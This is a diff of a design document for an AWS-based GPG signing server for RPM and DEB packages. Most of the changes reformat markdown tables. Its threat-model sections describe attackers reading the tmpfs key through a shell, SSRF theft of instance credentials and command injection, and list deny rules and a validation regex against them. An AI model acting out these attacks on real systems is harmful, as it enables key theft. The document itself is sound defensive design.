+| AWS insider accesses Secrets Manager storage        | AES-256 ciphertext only                             | KMS CMK                                    |
+| Key distributed via insecure channel (scp, ansible) | N/A — Secrets Manager is the only distribution path | SM architecture                            |
 
 **Layer 2 — Key on the running server (network + OS controls)**
 
 KMS and IAM do NOT protect against OS-level access to the signing server. Anyone with a shell on the instance can read the tmpfs keyring directly. The controls below are therefore the primary defence for the running key — they must be treated as mandatory, not optional hardening:
 
-| Threat | What attacker gets | Protected by |
-|--------|-------------------|-------------|
-| SSH access to signing server | Full access to tmpfs keyring and process memory | **No SSH rule in `sg-signing-server`** — port 22 not open to anyone |
-| AWS SSM Session Manager access | Same as SSH — full shell | **`ssm:StartSession` and `ssm:SendCommand` explicitly denied** in `role-signing-server` IAM policy |
-| SSRF attack stealing instance credentials | IAM role credentials via IMDS | **IMDSv2 enforced** — `--http-tokens required` on instance metadata |
-| Unauthorised process on signing server | Can call `/sign` or read keyring | Signing server is single-purpose; no other processes should run |
-| Shell access via application exploit | Code execution within signing server process | Minimal Python dependencies; input validation on all request fields |
-| Shell access (if somehow obtained) | Can read `/var/gpg-keyring` | This IS a compromise — incident response required; revoke CMK |
+| Threat                                    | What attacker gets                              | Protected by                                                                                       |
+| ----------------------------------------- | ----------------------------------------------- | -------------------------------------------------------------------------------------------------- |
+| SSH access to signing server              | Full access to tmpfs keyring and process memory | **No SSH rule in `sg-signing-server`** — port 22 not open to anyone                                |
+| AWS SSM Session Manager access            | Same as SSH — full shell                        | **`ssm:StartSession` and `ssm:SendCommand` explicitly denied** in `role-signing-server` IAM policy |
+| SSRF attack stealing instance credentials | IAM role credentials via IMDS                   | **IMDSv2 enforced** — `--http-tokens required` on instance metadata                                |
+| Unauthorised process on signing server    | Can call `/sign` or read keyring                | Signing server is single-purpose; no other processes should run                                    |
+| Shell access via application exploit      | Code execution within signing server process    | Minimal Python dependencies; input validation on all request fields                                |
+| Shell access (if somehow obtained)        | Can read `/var/gpg-keyring`                     | This IS a compromise — incident response required; revoke CMK                                      |
 
 **What no software control can prevent:**
 If an attacker obtains OS-level access to the running signing server, the GPG private key in the tmpfs keyring is readable. This is true of every key management approach — CloudHSM, KMS, HSM cards — because any running signing process must have access to key material to perform signing operations. The goal is to make OS-level access impossible, not to protect against it after the fact.
 
----
+______________________________________________________________________
 
 #### In-Memory GPG Keyring (tmpfs)
 
@@ -793,9 +814,10 @@ The current implementation uses an in-memory sliding window counter (per client,
 `gpgshim` is a lightweight Python script deployed on **build runners** (not the signing server) that acts as a drop-in replacement for the `gpg` binary. It exists for one specific reason: `rpmsign` calls `gpg` as a subprocess to produce signatures and embed them in RPM files. There is no way to redirect this subprocess call to an HTTP endpoint without intercepting it at the binary level.
 
 `gpgshim` pretends to be `gpg`. When `rpmsign` calls it, `gpgshim`:
+
 1. Reads the data piped from `rpmsign` via stdin
-2. Forwards it to the signing server via `POST /sign`
-3. Returns the signature bytes to `rpmsign` via the output file
+1. Forwards it to the signing server via `POST /sign`
+1. Returns the signature bytes to `rpmsign` via the output file
 
 `rpmsign` never knows it talked to a remote server — it sees a binary that behaves like `gpg`. The signing server never needs `rpmsign` installed — it only runs `gpg --detach-sign` directly.
 
@@ -804,6 +826,7 @@ The current implementation uses an in-memory sliding window counter (per client,
 #### Two-Call Optimization
 
 `rpmsign` calls `gpg` (and therefore `gpgshim`) **twice** per package:
+
 - **Call 1:** pipes the RPM header section (~4 KB) for signing
 - **Call 2:** pipes the full RPM body (up to 1 GB+) for signing
 
@@ -814,7 +837,7 @@ The current implementation uses an in-memory sliding window counter (per client,
 
 This means signing a 1 GB RPM costs exactly one ~4 KB network request to the signing server, regardless of package size.
 
----
+______________________________________________________________________
 
 ### 4.6 Operational Lifecycle — What Requires Manual Intervention vs What Is Automatic
 
@@ -917,19 +940,19 @@ Background thread wakes (every 6 hours)
 
 A key design goal is that all routine administration is performed via AWS APIs, not via shell access to the signing server. The following table covers every administrative scenario and how it is handled without SSH or SSM:
 
-| Operation | Who | How (no shell access needed) |
-|-----------|-----|------------------------------|
-| **GPG key rotation** | Key provisioner | `aws secretsmanager put-secret-value` with new key from an isolated machine → Phase 2: server picks up automatically on next scheduled sync. Phase 1: reboot instance via `aws ec2 reboot-instances` — systemd restarts server, new key loaded from Secrets Manager |
-| **KMS CMK rotation** | AWS admin | AWS KMS re-encrypts the Secrets Manager data key automatically — no server interaction needed |
-| **Emergency key revocation** | AWS admin | `aws kms disable-key` → all future `GetSecretValue` calls fail immediately → server cannot reload key on next restart |
-| **signing-server.py code update** | DevOps | Build new AMI with updated code → launch new EC2 instance (same IAM role, same SG, same fstab) → verify `/health` → terminate old instance. Never patch a running instance |
-| **OS security patches** | DevOps | Same as code update — replace instance from freshly patched AMI |
-| **TLS certificate renewal** | DevOps | Store certificate in Secrets Manager or ACM → instance replacement picks it up automatically |
-| **Configuration change** (rate limits, auth config) | DevOps | Update config in S3 or bake into new AMI → instance replacement |
-| **One-off operator signing** | Authorized operator | `sign-file` CLI tool via VPN — calls `POST /sign` directly, no server access needed |
-| **Server instance replacement** | DevOps | Launch new EC2 (same IAM role + fstab) → systemd starts automatically → key loads from Secrets Manager → old instance terminated |
+| Operation                                           | Who                 | How (no shell access needed)                                                                                                                                                                                                                                        |
+| --------------------------------------------------- | ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **GPG key rotation**                                | Key provisioner     | `aws secretsmanager put-secret-value` with new key from an isolated machine → Phase 2: server picks up automatically on next scheduled sync. Phase 1: reboot instance via `aws ec2 reboot-instances` — systemd restarts server, new key loaded from Secrets Manager |
+| **KMS CMK rotation**                                | AWS admin           | AWS KMS re-encrypts the Secrets Manager data key automatically — no server interaction needed                                                                                                                                                                       |
+| **Emergency key revocation**                        | AWS admin           | `aws kms disable-key` → all future `GetSecretValue` calls fail immediately → server cannot reload key on next restart                                                                                                                                               |
+| **signing-server.py code update**                   | DevOps              | Build new AMI with updated code → launch new EC2 instance (same IAM role, same SG, same fstab) → verify `/health` → terminate old instance. Never patch a running instance                                                                                          |
+| **OS security patches**                             | DevOps              | Same as code update — replace instance from freshly patched AMI                                                                                                                                                                                                     |
+| **TLS certificate renewal**                         | DevOps              | Store certificate in Secrets Manager or ACM → instance replacement picks it up automatically                                                                                                                                                                        |
+| **Configuration change** (rate limits, auth config) | DevOps              | Update config in S3 or bake into new AMI → instance replacement                                                                                                                                                                                                     |
+| **One-off operator signing**                        | Authorized operator | `sign-file` CLI tool via VPN — calls `POST /sign` directly, no server access needed                                                                                                                                                                                 |
+| **Server instance replacement**                     | DevOps              | Launch new EC2 (same IAM role + fstab) → systemd starts automatically → key loads from Secrets Manager → old instance terminated                                                                                                                                    |
 
----
+______________________________________________________________________
 
 #### Break-Glass — Emergency Shell Access
 
@@ -966,13 +989,14 @@ Break-glass procedure:
 
 The critical point: **removing SSH from the Security Group and adding an IAM deny on SSM does not make the server permanently inaccessible** — it makes access an explicit, audited, approved act rather than a routine convenience. Every step of the break-glass procedure appears in CloudTrail.
 
----
+______________________________________________________________________
 
 ## 5. Improvements Over Baseline
 
 ### 5.1 Current Baseline
 
 The existing signing process works as follows:
+
 - Build runners build packages and upload unsigned artifacts to S3
 - Only **release builds** are signed — dev and nightly builds are not signed at all
 - Signing is performed **manually** by an authorized engineer after the build completes, using GPG installed on an **in-house signing server** with no external network exposure
@@ -981,44 +1005,45 @@ The existing signing process works as follows:
 
 This process works but does not scale with the build pipeline and introduces manual steps that can delay releases and create inconsistency between builds.
 
----
+______________________________________________________________________
 
 ### 5.2 Improvements
 
-| Area | Current Baseline | After |
-|------|-----------------|-------|
-| **Signing trigger** | Manual — engineer runs signing after build completes | **Autonomous** — signing happens automatically as part of the CI/CD pipeline, no human interaction required |
-| **Build types signed** | Release builds only — dev and nightly are unsigned | **All configured build tiers** (dev, nightly, release) signed automatically when `release_type` is set |
-| **Release pipeline speed** | Signing is a manual gate — release blocked until an engineer is available | **No manual gate** — signing completes within the CI run; S3 upload follows immediately |
-| **Signing server hosting** | In-house server, manually maintained, no HA | **AWS-managed EC2** in a private VPC subnet; Phase 2 adds primary + secondary with automatic ALB failover |
-| **Key storage** | GPG private key on the in-house signing server's disk | **AWS Secrets Manager** encrypted with KMS CMK; plaintext exists only in RAM during `gpg --import` at startup |
-| **Key access control** | Physical/network access to the in-house server | **IAM resource policy** on Secrets Manager secret — only `role-signing-server` can retrieve the key; enforced by AWS |
-| **Key audit trail** | No record of when the key was used or by whom | **CloudTrail** records every `secretsmanager:GetSecretValue` and `kms:Decrypt` call — timestamp, caller identity, key used |
-| **Key revocation** | Physically remove or overwrite key on the server | **Disable KMS CMK** — all future decrypts fail immediately across all server instances simultaneously |
-| **Signing audit trail** | No record of which packages were signed, when, or by which build | **Structured JSON audit log** per signing request → CloudWatch Logs; includes source IP, key used, digest algo, latency |
-| **Network exposure** | In-house server — no external exposure (same as new design) | **AWS private subnet** — no internet gateway, no public IP; Security Groups restrict access to build runner IPs only |
-| **One-off / operator signing** | Engineer manually runs GPG on the in-house server | **sign-file CLI tool** — authorized operator signs a specific file via VPN without needing access to the signing server host |
-| **Scalability** | Single server; one engineer can sign at a time | **Concurrent signing** — thread semaphore allows up to 10 parallel signing operations; Phase 2 adds a second server |
-| **Network transfer (RPM)** | Full signing toolchain runs locally on in-house server | **gpgshim** sends only the ~4 KB RPM header to the signing server; 250× reduction vs full RPM transfer |
+| Area                           | Current Baseline                                                          | After                                                                                                                        |
+| ------------------------------ | ------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| **Signing trigger**            | Manual — engineer runs signing after build completes                      | **Autonomous** — signing happens automatically as part of the CI/CD pipeline, no human interaction required                  |
+| **Build types signed**         | Release builds only — dev and nightly are unsigned                        | **All configured build tiers** (dev, nightly, release) signed automatically when `release_type` is set                       |
+| **Release pipeline speed**     | Signing is a manual gate — release blocked until an engineer is available | **No manual gate** — signing completes within the CI run; S3 upload follows immediately                                      |
+| **Signing server hosting**     | In-house server, manually maintained, no HA                               | **AWS-managed EC2** in a private VPC subnet; Phase 2 adds primary + secondary with automatic ALB failover                    |
+| **Key storage**                | GPG private key on the in-house signing server's disk                     | **AWS Secrets Manager** encrypted with KMS CMK; plaintext exists only in RAM during `gpg --import` at startup                |
+| **Key access control**         | Physical/network access to the in-house server                            | **IAM resource policy** on Secrets Manager secret — only `role-signing-server` can retrieve the key; enforced by AWS         |
+| **Key audit trail**            | No record of when the key was used or by whom                             | **CloudTrail** records every `secretsmanager:GetSecretValue` and `kms:Decrypt` call — timestamp, caller identity, key used   |
+| **Key revocation**             | Physically remove or overwrite key on the server                          | **Disable KMS CMK** — all future decrypts fail immediately across all server instances simultaneously                        |
+| **Signing audit trail**        | No record of which packages were signed, when, or by which build          | **Structured JSON audit log** per signing request → CloudWatch Logs; includes source IP, key used, digest algo, latency      |
+| **Network exposure**           | In-house server — no external exposure (same as new design)               | **AWS private subnet** — no internet gateway, no public IP; Security Groups restrict access to build runner IPs only         |
+| **One-off / operator signing** | Engineer manually runs GPG on the in-house server                         | **sign-file CLI tool** — authorized operator signs a specific file via VPN without needing access to the signing server host |
+| **Scalability**                | Single server; one engineer can sign at a time                            | **Concurrent signing** — thread semaphore allows up to 10 parallel signing operations; Phase 2 adds a second server          |
+| **Network transfer (RPM)**     | Full signing toolchain runs locally on in-house server                    | **gpgshim** sends only the ~4 KB RPM header to the signing server; 250× reduction vs full RPM transfer                       |
 
----
+______________________________________________________________________
 
 ### 5.3 What Does Not Change
 
-| Area | Note |
-|------|------|
+| Area                                    | Note                                                                                                                                    |
+| --------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
 | **Network isolation of signing server** | The in-house server has no external exposure; the AWS signing server is also in a private subnet with no internet access — same posture |
-| **GPG toolchain** | `gpg` and `rpmsign` are still used; the signing server runs standard GnuPG 2.x |
-| **Signature format** | OpenPGP format signatures — fully compatible with existing `rpm --checksig` and `apt` verification |
-| **Public key distribution** | How end users obtain the public key to verify packages is unchanged — same keyserver or static URL process |
+| **GPG toolchain**                       | `gpg` and `rpmsign` are still used; the signing server runs standard GnuPG 2.x                                                          |
+| **Signature format**                    | OpenPGP format signatures — fully compatible with existing `rpm --checksig` and `apt` verification                                      |
+| **Public key distribution**             | How end users obtain the public key to verify packages is unchanged — same keyserver or static URL process                              |
 
----
+______________________________________________________________________
 
 ## 6. HTTP API
 
 ### `POST /sign`
 
 Request body:
+
 ```json
 {
   "data":        "<base64-encoded bytes to sign>",
@@ -1029,15 +1054,16 @@ Request body:
 }
 ```
 
-| Field | Required | Description |
-|-------|----------|-------------|
-| `data` | Yes | Base64-encoded bytes. For RPM: the header section piped by rpmsign. For metadata: the full Release or repomd.xml file. |
-| `key_id` | Yes | GPG key identifier (email or hex key ID). Must match a key in the server keyring and be permitted for the caller's role. |
-| `digest_algo` | No | Hash algorithm. Default: `SHA256`. Supported: `SHA256`, `SHA512`. |
-| `armor` | No | Return ASCII-armored signature. Default: `false`. Required for metadata signatures. |
-| `clearsign` | No | Produce clearsigned output (data + signature in one block). Default: `false`. Required for DEB `InRelease`. |
+| Field         | Required | Description                                                                                                              |
+| ------------- | -------- | ------------------------------------------------------------------------------------------------------------------------ |
+| `data`        | Yes      | Base64-encoded bytes. For RPM: the header section piped by rpmsign. For metadata: the full Release or repomd.xml file.   |
+| `key_id`      | Yes      | GPG key identifier (email or hex key ID). Must match a key in the server keyring and be permitted for the caller's role. |
+| `digest_algo` | No       | Hash algorithm. Default: `SHA256`. Supported: `SHA256`, `SHA512`.                                                        |
+| `armor`       | No       | Return ASCII-armored signature. Default: `false`. Required for metadata signatures.                                      |
+| `clearsign`   | No       | Produce clearsigned output (data + signature in one block). Default: `false`. Required for DEB `InRelease`.              |
 
 Response (success `200`):
+
 ```json
 {
   "signature":   "<base64-encoded signature>",
@@ -1052,13 +1078,13 @@ Error codes: `400` bad request, `401` missing/invalid app token (Phase 2), `403`
 
 Returns `200 OK` with `{"status": "ok"}` when the server is running and the GPG keyring is loaded. Used by ALB health checks (Phase 2) and monitoring.
 
----
+______________________________________________________________________
 
 ## 7. Sample Communication Flows
 
 These examples show the full request path for each caller type, including the HTTPS wire format. Both examples use Phase 2 app-layer tokens (`Authorization: Bearer`). In Phase 1, the `Authorization` header is omitted — Security Groups provide the only access control.
 
----
+______________________________________________________________________
 
 ### 7.1 RPM Package Signing via gpgshim
 
@@ -1151,7 +1177,7 @@ Content-Length: 398
 }
 ```
 
----
+______________________________________________________________________
 
 ### 7.2 Ad-hoc Signing Request (Operator, Direct HTTPS)
 
@@ -1275,7 +1301,7 @@ Decoded, the `signature` field contains a complete `-----BEGIN PGP SIGNED MESSAG
 }
 ```
 
----
+______________________________________________________________________
 
 ### 7.3 Common Error Responses
 
@@ -1297,7 +1323,7 @@ HTTP/1.1 503 Service Unavailable
 {"error": "Server busy, try again later"}
 ```
 
----
+______________________________________________________________________
 
 ## 8. Security Considerations
 
@@ -1305,56 +1331,56 @@ This section summarises the security posture by threat layer. Detailed design ra
 
 Security operates at three distinct layers. Controls at one layer do not substitute for controls at another.
 
----
+______________________________________________________________________
 
 ### 8.1 Layer 1 — Network Perimeter
 
-**Purpose:** Prevent unauthorized hosts from reaching the signing server at all.  
+**Purpose:** Prevent unauthorized hosts from reaching the signing server at all.
 **Enforced by:** AWS VPC Security Groups and routing — not application code.
 
-| Control | What it does |
-|---------|-------------|
-| `sg-signing-server` inbound | Allows TCP 443 from `sg-build-runner`, operator VPN CIDR, and (Phase 1b) the API Gateway VPC Link's ENIs only. All other sources silently dropped. |
-| No public IP / internet gateway | Server has no route to the internet — unreachable from outside the VPC |
-| Outbound restricted to VPC endpoints | Server can only reach Secrets Manager, KMS, and CloudWatch via PrivateLink — no other outbound traffic permitted |
+| Control                              | What it does                                                                                                                                       |
+| ------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `sg-signing-server` inbound          | Allows TCP 443 from `sg-build-runner`, operator VPN CIDR, and (Phase 1b) the API Gateway VPC Link's ENIs only. All other sources silently dropped. |
+| No public IP / internet gateway      | Server has no route to the internet — unreachable from outside the VPC                                                                             |
+| Outbound restricted to VPC endpoints | Server can only reach Secrets Manager, KMS, and CloudWatch via PrivateLink — no other outbound traffic permitted                                   |
 
 **Phase 1b addition — cross-cloud path:** for build runners outside AWS, the perimeter is API Gateway (public hostname, `AWS_IAM` auth — rejects any request without a valid AWS SigV4 signature before it reaches our code) → VPC Link (private, AWS-internal only) → internal NLB (no public IP) → signing server. The signing server's own network exposure is unchanged by this addition — only the VPC Link's ENIs are added to `sg-signing-server`'s allow-list, not a broader range. See §4.1b for the full design and the caller-identity trust boundary (`TRUST_APIGW_HEADER`, `X-Signing-Client-Role`).
 
 See §4.1 for the full rationale on why VPC Security Groups are the primary control for same-cloud build runners, and §4.1b for why SigV4 is introduced specifically for cross-cloud access.
 
----
+______________________________________________________________________
 
 ### 8.2 Layer 2 — Key at Rest and in Distribution
 
-**Purpose:** Protect the GPG private key while stored in AWS and during server startup fetch.  
+**Purpose:** Protect the GPG private key while stored in AWS and during server startup fetch.
 **Enforced by:** KMS CMK + Secrets Manager resource policy.
 
-| Control | What it does |
-|---------|-------------|
-| Secrets Manager + KMS CMK | GPG private key stored as KMS-encrypted ciphertext — plaintext never persists on any disk |
-| IAM resource policy on secrets | Only `role-signing-server` can call `GetSecretValue` — no other AWS principal |
-| tmpfs keyring | After startup import, key exists in RAM only — EBS snapshots cannot capture it |
-| CloudTrail on KMS | Every `GetSecretValue` triggers a `kms:Decrypt` — logged with caller identity and timestamp |
+| Control                        | What it does                                                                                |
+| ------------------------------ | ------------------------------------------------------------------------------------------- |
+| Secrets Manager + KMS CMK      | GPG private key stored as KMS-encrypted ciphertext — plaintext never persists on any disk   |
+| IAM resource policy on secrets | Only `role-signing-server` can call `GetSecretValue` — no other AWS principal               |
+| tmpfs keyring                  | After startup import, key exists in RAM only — EBS snapshots cannot capture it              |
+| CloudTrail on KMS              | Every `GetSecretValue` triggers a `kms:Decrypt` — logged with caller identity and timestamp |
 
 **Important limit:** KMS and Secrets Manager protect the key *before* it reaches the server. Once the key is in tmpfs, these controls provide no further protection. OS-level access bypasses them entirely — see Layer 3.
 
 See §4.3 for the full options analysis (KMS Asymmetric vs CloudHSM vs Secrets Manager + CMK) and the rationale for the chosen approach.
 
----
+______________________________________________________________________
 
 ### 8.3 Layer 3 — Server Instance Hardening
 
-**Purpose:** Make OS-level access to the signing server impossible under normal operations.  
+**Purpose:** Make OS-level access to the signing server impossible under normal operations.
 **Why this matters:** Once the GPG key is in the tmpfs keyring, anyone with a shell on the instance can read it — regardless of KMS, IAM, or any other AWS control. This layer is therefore the most critical.
 
-| Control | What it does | Enforced by |
-|---------|-------------|-------------|
-| No SSH inbound | Port 22 not open to anyone — not even admins or bastion hosts | Security Group |
-| SSM Session Manager denied | `ssm:StartSession` and `ssm:SendCommand` explicitly denied in `role-signing-server` IAM policy | IAM deny policy |
-| IMDSv2 enforced | `--http-tokens required` prevents SSRF attacks stealing instance IAM credentials | EC2 instance config |
-| Immutable infrastructure | Server is never patched in place — updates replace the instance from a new AMI | Operational policy |
-| Single-purpose server | Only `signing-server.py` runs — no other services, no package manager in prod | AMI hardening |
-| Input validation | `key_id` validated against strict regex before passing to GPG subprocess — prevents command injection | Application code |
+| Control                    | What it does                                                                                          | Enforced by         |
+| -------------------------- | ----------------------------------------------------------------------------------------------------- | ------------------- |
+| No SSH inbound             | Port 22 not open to anyone — not even admins or bastion hosts                                         | Security Group      |
+| SSM Session Manager denied | `ssm:StartSession` and `ssm:SendCommand` explicitly denied in `role-signing-server` IAM policy        | IAM deny policy     |
+| IMDSv2 enforced            | `--http-tokens required` prevents SSRF attacks stealing instance IAM credentials                      | EC2 instance config |
+| Immutable infrastructure   | Server is never patched in place — updates replace the instance from a new AMI                        | Operational policy  |
+| Single-purpose server      | Only `signing-server.py` runs — no other services, no package manager in prod                         | AMI hardening       |
+| Input validation           | `key_id` validated against strict regex before passing to GPG subprocess — prevents command injection | Application code    |
 
 **Fundamental limit:** If an attacker achieves OS-level access to a running signing server, the GPG private key in tmpfs is readable. This is true of every key management approach — CloudHSM, hardware tokens, KMS asymmetric — because any running signing process must have access to key material. The correct response is: disable the KMS CMK immediately, which stops all future key fetches, then rotate the GPG key pair.
 
@@ -1362,44 +1388,44 @@ See §4.3 for the full options analysis (KMS Asymmetric vs CloudHSM vs Secrets M
 
 Removing SSH does not mean the server is unmanageable. All routine operations are done via AWS APIs, not shell access:
 
-| Operation | How (no SSH needed) |
-|-----------|-------------------|
-| **GPG key rotation** | `aws secretsmanager put-secret-value` from provisioner workstation → server picks up on next restart or scheduled sync |
-| **Code update** | Build new AMI → launch new EC2 with same IAM role → verify `/health` → terminate old instance |
-| **OS patching** | Same as code update — replace instance from freshly patched AMI |
-| **View logs** | `aws logs filter-log-events` from workstation, or `journalctl` via CloudWatch |
-| **Check server health** | `curl -k https://<server-ip>/health` from build runner or operator via VPN |
-| **Emergency access** | Break-glass procedure: temporarily enable SSM via IAM policy change (audited in CloudTrail), conduct investigation, revert immediately |
+| Operation               | How (no SSH needed)                                                                                                                    |
+| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
+| **GPG key rotation**    | `aws secretsmanager put-secret-value` from provisioner workstation → server picks up on next restart or scheduled sync                 |
+| **Code update**         | Build new AMI → launch new EC2 with same IAM role → verify `/health` → terminate old instance                                          |
+| **OS patching**         | Same as code update — replace instance from freshly patched AMI                                                                        |
+| **View logs**           | `aws logs filter-log-events` from workstation, or `journalctl` via CloudWatch                                                          |
+| **Check server health** | `curl -k https://<server-ip>/health` from build runner or operator via VPN                                                             |
+| **Emergency access**    | Break-glass procedure: temporarily enable SSM via IAM policy change (audited in CloudTrail), conduct investigation, revert immediately |
 
 For the full break-glass procedure and all operational commands, see **`operations-runbook.md`**.
 
----
+______________________________________________________________________
 
 ### 8.4 Application-Level Controls
 
 **Purpose:** Protect against malformed requests, resource exhaustion, and audit gaps.
 
-| Threat | Control |
-|--------|---------|
-| `key_id` command injection into GPG subprocess | Strict regex: `[a-zA-Z0-9@.\-_ <>]+`, max 256 chars — rejected on mismatch |
-| Runaway job exhausting signing capacity | Thread semaphore (max 10 concurrent) + per-source-IP rate limiting (sliding window) |
-| Slow-read / slowloris attack | Socket read timeout: 10 seconds |
-| Oversized request payload | Body size limit: 10 KB — rejected with HTTP 413 |
-| Replay of a captured signature | GPG signatures bind to specific data — replayed signature for different data fails `gpg --verify` |
-| Audit gaps | Every request (success and failure) written to stdout → CloudWatch Logs: source IP, tier, artifact, latency, status |
+| Threat                                         | Control                                                                                                             |
+| ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
+| `key_id` command injection into GPG subprocess | Strict regex: `[a-zA-Z0-9@.\-_ <>]+`, max 256 chars — rejected on mismatch                                          |
+| Runaway job exhausting signing capacity        | Thread semaphore (max 10 concurrent) + per-source-IP rate limiting (sliding window)                                 |
+| Slow-read / slowloris attack                   | Socket read timeout: 10 seconds                                                                                     |
+| Oversized request payload                      | Body size limit: 10 KB — rejected with HTTP 413                                                                     |
+| Replay of a captured signature                 | GPG signatures bind to specific data — replayed signature for different data fails `gpg --verify`                   |
+| Audit gaps                                     | Every request (success and failure) written to stdout → CloudWatch Logs: source IP, tier, artifact, latency, status |
 
----
+______________________________________________________________________
 
 ### 8.5 Operational References
 
 The security controls described in this section are implemented and operated according to:
 
-| Topic | Reference |
-|-------|-----------|
-| Full provisioning sequence (IAM → KMS → SM → EC2) | `operations-runbook.md` §1 |
-| Day-to-day operations (status, logs, health check) | `operations-runbook.md` §2 |
-| GPG key rotation procedure | `operations-runbook.md` §3 |
-| Emergency key revocation | `operations-runbook.md` §4.1 |
-| Break-glass shell access procedure | `operations-runbook.md` §4.2 |
-| Server instance replacement | `operations-runbook.md` §4.3 |
-| Troubleshooting common errors | `operations-runbook.md` §5 |
+| Topic                                              | Reference                    |
+| -------------------------------------------------- | ---------------------------- |
+| Full provisioning sequence (IAM → KMS → SM → EC2)  | `operations-runbook.md` §1   |
+| Day-to-day operations (status, logs, health check) | `operations-runbook.md` §2   |
+| GPG key rotation procedure                         | `operations-runbook.md` §3   |
+| Emergency key revocation                           | `operations-runbook.md` §4.1 |
+| Break-glass shell access procedure                 | `operations-runbook.md` §4.2 |
+| Server instance replacement                        | `operations-runbook.md` §4.3 |
+| Troubleshooting common errors                      | `operations-runbook.md` §5   |
